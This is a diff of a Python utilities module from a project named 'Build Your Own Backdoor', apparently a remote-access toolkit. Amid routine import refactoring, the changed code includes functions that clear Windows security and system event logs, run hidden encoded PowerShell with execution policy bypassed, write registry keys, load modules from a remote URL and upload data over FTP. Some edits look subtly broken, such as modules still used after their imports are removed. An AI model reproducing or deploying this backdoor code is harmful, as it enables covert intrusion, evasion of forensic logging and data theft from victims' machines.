@@ -3,39 +3,12 @@
 'Utilities (Build Your Own Backdoor)'
 
 # standard library
-import json
-import zlib
-import uuid
-import Queue
-import string
-import base64
-import ctypes
-import pickle
-import struct
-import socket
-import random
-import urllib
-import urllib2
-import marshal
-import zipfile
 import logging
-import tempfile
-import itertools
-import functools
-import threading
-import subprocess
 import contextlib
-import collections
-import logging.handlers
-try:
-    from cStringIO import StringIO
-except:
-    from StringIO import StringIO
 
 # main
 logging.basicConfig(level=logging.DEBUG, handler=logging.StreamHandler())
 __logger__   = logging.getLogger(__name__)
-__lock__     = threading.Lock()
 __verbose__  = True
 
 def log(info):
@@ -44,8 +17,7 @@ def log(info):
 
     """
     if __verbose__:
-        with __lock__:
-            __logger__.debug(str(info))
+        __logger__.debug(str(info))
 
 def imports(packages, module=None):
     """ 
@@ -88,7 +60,8 @@ def remote_repo(modules, base_url='http://localhost:8000/'):
 
     """
     import sys
-    remote_importer = importer.Importer(modules, base_url)
+    import importer
+    remote_importer = importer.RemoteImporter(modules, base_url)
     sys.meta_path.append(remote_importer)
     yield
     for importer in sys.meta_path:
@@ -108,8 +81,8 @@ def public_ip():
     Return public IP address of host machine
 
     """
-    import urllib2
-    return urllib2.urlopen('http://api.ipify.org').read()
+    import urllib
+    return urllib.urlopen('http://api.ipify.org').read()
 
 def local_ip():
     """ 
@@ -156,7 +129,8 @@ def administrator():
     Return True if current user is administrator, otherwise False
 
     """
-    import os, ctypes
+    import os
+    import ctypes
     return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name is 'nt' else os.getuid() == 0)
 
 def ipv4(address):
@@ -211,13 +185,13 @@ def post(url, headers={}, data={}, as_json=False):
         req = requests.post(url, headers=headers, data=data)
         output = req.content
         if as_json:
-            import json
             try:
                 output = req.json()
             except: pass
         return output
     except ImportError:
-        import urllib, urllib2
+        import urllib
+        import urllib2
         data = urllib.urlencode(data)
         req  = urllib2.Request(str(url), data=data)
         for key, value in headers.items():
@@ -229,23 +203,7 @@ def post(url, headers={}, data={}, as_json=False):
                 output = json.loads(output)
             except: pass
         return output
-
-def alert(text, title):
-    """ 
-    Windows alert message box
-
-    `Required`
-    :param str text:    message in the alert box
-    :param str title:   title of the alert box
-
-    """
-    import os, ctypes, threading
-    if os.name == 'nt':
-        t = threading.Thread(target=ctypes.windll.user32.MessageBoxA, args=(None, text, title, 0))
-        t.daemon = True
-        t.start()
-        return t
-
+    
 def normalize(source):
     """ 
     Normalize data/text/stream
@@ -278,14 +236,15 @@ def registry_key(key, subkey, value):
     Returns True if successful, otherwise False
 
     """
-    import os
-    if os.name is 'nt':
+    try:
         import _winreg
         reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, key, 0, _winreg.KEY_WRITE)
         _winreg.SetValueEx(reg_key, subkey, 0, _winreg.REG_SZ, value)
         _winreg.CloseKey(reg_key)
         return True
-    return False
+    except Exception as e:
+        log(e)
+        return False
 
 def png(image):
     """ 
@@ -297,11 +256,9 @@ def png(image):
     Returns raw image data in PNG format
 
     """
-    import struct, numpy
-    try:
-        from cStringIO import StringIO
-    except:
-        from StringIO import StringIO
+    import numpy
+    import struct
+    import StringIO
     if isinstance(image, numpy.ndarray):
         width, height = (image.shape[1], image.shape[0])
         data = image.tobytes()
@@ -368,12 +325,13 @@ def clear_system_logs():
     Clear Windows system logs (Application, security, Setup, System)
 
     """
-    import os
-    if os.name == 'nt':
+    try:
         for log in ["application","security","setup","system"]:
             output = powershell_exec('"& { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\"%s\")}"' % log)
             if output:
                 log(output)
+    except Exception as e:
+        log(e)
 
 def kwargs(data):
     """ 
@@ -397,13 +355,13 @@ def powershell(code):
     Returns any output from Powershell executing the code
 
     """
-    import os, base64
-    if os.name is 'nt':
-        try:
-            powershell = r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe' if os.path.exists(r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe') else os.popen('where powershell').read().rstrip()
-            return os.popen('{} -exec bypass -window hidden -noni -nop -encoded {}'.format(powershell, base64.b64encode(code))).read()
-        except Exception as e:
-            log("{} error: {}".format(powershell.func_name, str(e)))
+    import os
+    import base64
+    try:
+        powershell = r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe' if os.path.exists(r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe') else os.popen('where powershell').read().rstrip()
+        return os.popen('{} -exec bypass -window hidden -noni -nop -encoded {}'.format(powershell, base64.b64encode(code))).read()
+    except Exception as e:
+        log("{} error: {}".format(powershell.func_name, str(e)))
 
 def display(output, color=None, style=None, end='\n', event=None, lock=None):
     """ 
@@ -436,8 +394,9 @@ def color():
 
     """
     try:
-        import random, colorama
-        return getattr(colorama.Fore, random.choice(['RED','CYAN','GREEN','YELLOW','MAGENTA']))
+        import random
+        import colorama
+        return random.choice(filter(str.isupper, dir(colorama.Fore)))
     except Exception as e:
         log("{} error: {}".format(color.func_name, str(e)))
 
@@ -489,11 +448,10 @@ def ftp(source, host=None, user=None, password=None, filetype=None):
     :param str filetype:  target file type (default: .txt)
 
     """
-    import os, time, ftplib
-    try:
-        from cStringIO import StringIO
-    except ImportError:
-        from StringIO import StringIO
+    import os
+    import time
+    import ftplib
+    
     if host and user and password:
         path  = ''
         local = time.ctime().split()
@@ -503,7 +461,7 @@ def ftp(source, host=None, user=None, password=None, filetype=None):
         elif hasattr(source, 'seek'):
             source.seek(0)
         else:
-            source = StringIO(source)
+            source = StringIO.StringIO(source)
         try:
             ftp = ftplib.FTP(host=host, user=user, password=password)
         except:
@@ -566,10 +524,8 @@ def spinner(flag):
     spinner = itertools.cycle(['-', '/', '|', '\\'])
     while True:
         flag.wait()
-        with __lock__:
-            sys.stdout.write(next(spinner))
-            sys.stdout.flush()
+        sys.stdout.write(next(spinner))
+        sys.stdout.flush()
         flag.wait(0.2)
-        with __lock__:
-            sys.stdout.write('\b')
-            sys.stdout.flush()    
+        sys.stdout.write('\b')
+        sys.stdout.flush()    
